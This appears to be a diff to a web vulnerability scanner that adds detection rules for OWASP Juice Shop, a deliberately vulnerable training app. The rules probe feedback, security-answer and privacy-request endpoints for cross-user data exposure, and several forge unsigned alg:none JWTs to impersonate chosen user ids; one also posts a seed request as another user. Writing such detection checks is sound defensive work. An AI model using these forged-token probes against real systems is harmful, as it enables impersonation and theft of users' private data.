@@ -37373,6 +37373,171 @@ const juiceShopHintsExposureRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const juiceShopFeedbacksBolaLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const url = new URL("/api/Feedbacks", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, { maxBytes: 65536 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"status"\s*:\s*"success"/.test(doc.body) || !/"data"\s*:\s*\[/.test(doc.body)) return NEGATIVE;
+  const userIds = [...doc.body.matchAll(/"UserId"\s*:\s*(\d+)/g)].map((m) => m[1]);
+  const uniqueUserIds = new Set(userIds);
+  if (uniqueUserIds.size < 2 || userIds.length < 2) return NEGATIVE;
+  const commentMatch = doc.body.match(/"comment"\s*:\s*"([^"]{12,})"/);
+  return {
+    fired: true,
+    confidence: uniqueUserIds.size >= 3 ? 0.93 : 0.91,
+    evidence: {
+      url,
+      userIds: [...uniqueUserIds].slice(0, 6),
+      feedbackCount: userIds.length,
+      sampleComment: commentMatch?.[1]?.slice(0, 80),
+      snippet: doc.body.slice(0, 180).trim(),
+      note: "Juice Shop GET /api/Feedbacks without auth returns product reviews spanning multiple UserId values — BOLA oracle"
+    }
+  };
+};
+
+const juiceShopFeedbacksBolaRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/api\/Feedbacks\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopFeedbacksBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /api/Feedbacks route scan — unauthenticated cross-user product reviews exposed — route-specific BOLA oracle"
+    }
+  };
+};
+
+const juiceShopSecurityAnswersDisclosureLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const url = new URL("/api/SecurityAnswers", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    maxBytes: 65536,
+    headers: juiceShopDataIdAuthHeader()
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"status"\s*:\s*"success"/.test(doc.body) || !/"data"\s*:\s*\[/.test(doc.body)) return NEGATIVE;
+  const userIds = [...doc.body.matchAll(/"UserId"\s*:\s*(\d+)/g)].map((m) => m[1]);
+  const uniqueUserIds = new Set(userIds);
+  const answerHashes = [...doc.body.matchAll(/"answer"\s*:\s*"([a-f0-9]{32,64})"/gi)].map((m) => m[1]);
+  if (uniqueUserIds.size < 2 || answerHashes.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: uniqueUserIds.size >= 3 ? 0.93 : 0.91,
+    evidence: {
+      url,
+      userIds: [...uniqueUserIds].slice(0, 6),
+      answerCount: answerHashes.length,
+      sampleAnswerHash: answerHashes[0]?.slice(0, 16),
+      snippet: doc.body.slice(0, 180).trim(),
+      note: "Juice Shop GET /api/SecurityAnswers with alg:none JWT returns password-reset answer hashes for multiple users — disclosure oracle"
+    }
+  };
+};
+
+const juiceShopSecurityAnswersDisclosureRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/api\/SecurityAnswers\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopSecurityAnswersDisclosureLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /api/SecurityAnswers route scan — cross-user password-reset answer hashes exposed — route-specific disclosure oracle"
+    }
+  };
+};
+
+const juiceShopPrivacyRequestsBolaLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const probeUserId = 2;
+  const now = Math.floor(Date.now() / 1000);
+  const probeAuthHeader = {
+    Authorization: `Bearer ${buildAlgNoneJwt({
+      data: { id: probeUserId },
+      iat: now,
+      exp: now + 3600
+    })}`,
+    "Content-Type": "application/json"
+  };
+  const seedAuthHeader = {
+    Authorization: `Bearer ${buildAlgNoneJwt({
+      data: { id: 1 },
+      iat: now,
+      exp: now + 3600
+    })}`,
+    "Content-Type": "application/json"
+  };
+  const url = new URL("/api/PrivacyRequests", ctx.origin).toString();
+
+  const readForeignRequests = async () => {
+    const doc = await ctx.probe.get(url, { maxBytes: 8192, headers: probeAuthHeader });
+    if (doc.status < 200 || doc.status >= 400) return null;
+    if (!/"status"\s*:\s*"success"/.test(doc.body) || !/"data"\s*:\s*\[/.test(doc.body)) return null;
+    const foreignUserIds = [...doc.body.matchAll(/"UserId"\s*:\s*(\d+)/g)]
+      .map((m) => m[1])
+      .filter((id) => id !== String(probeUserId));
+    if (foreignUserIds.length === 0) return null;
+    return { doc, foreignUserIds };
+  };
+
+  let hit = await readForeignRequests();
+  if (!hit) {
+    await ctx.probe.get(url, {
+      method: "POST",
+      maxBytes: 4096,
+      headers: seedAuthHeader,
+      body: JSON.stringify({ message: "thugir privacy bola probe", UserId: 1 })
+    });
+    hit = await readForeignRequests();
+  }
+  if (!hit) return NEGATIVE;
+
+  const requestId = hit.doc.body.match(/"id"\s*:\s*(\d+)/)?.[1];
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url,
+      probeUserId,
+      foreignUserIds: [...new Set(hit.foreignUserIds)].slice(0, 4),
+      requestId,
+      snippet: hit.doc.body.slice(0, 180).trim(),
+      note: "Juice Shop GET /api/PrivacyRequests with alg:none JWT (data.id=2) returns another user's GDPR privacy request — BOLA oracle"
+    }
+  };
+};
+
+const juiceShopPrivacyRequestsBolaRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/api\/PrivacyRequests\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopPrivacyRequestsBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /api/PrivacyRequests route scan — authenticated user reads another user's privacy request — route-specific BOLA oracle"
+    }
+  };
+};
+
 function wrongsecretsChallengeIdFromUrl(url: string): string | null {
   const m = url.match(/\/challenge\/(?:challenge-)?(\d+)\/?(?:\?|#|$)/i);
   return m?.[1] ?? null;
@@ -46046,6 +46211,12 @@ export const RULES: Record<string, Rule> = {
   juiceShopQuantitysExposureRouteLiveOracle,
   juiceShopHintsExposureLiveOracle,
   juiceShopHintsExposureRouteLiveOracle,
+  juiceShopFeedbacksBolaLiveOracle,
+  juiceShopFeedbacksBolaRouteLiveOracle,
+  juiceShopSecurityAnswersDisclosureLiveOracle,
+  juiceShopSecurityAnswersDisclosureRouteLiveOracle,
+  juiceShopPrivacyRequestsBolaLiveOracle,
+  juiceShopPrivacyRequestsBolaRouteLiveOracle,
   wrongsecretsChallengeLiveOracle,
   wrongsecretsChallengeRouteLiveOracle,
   clientSideVulnlabApiLabsEvidence,
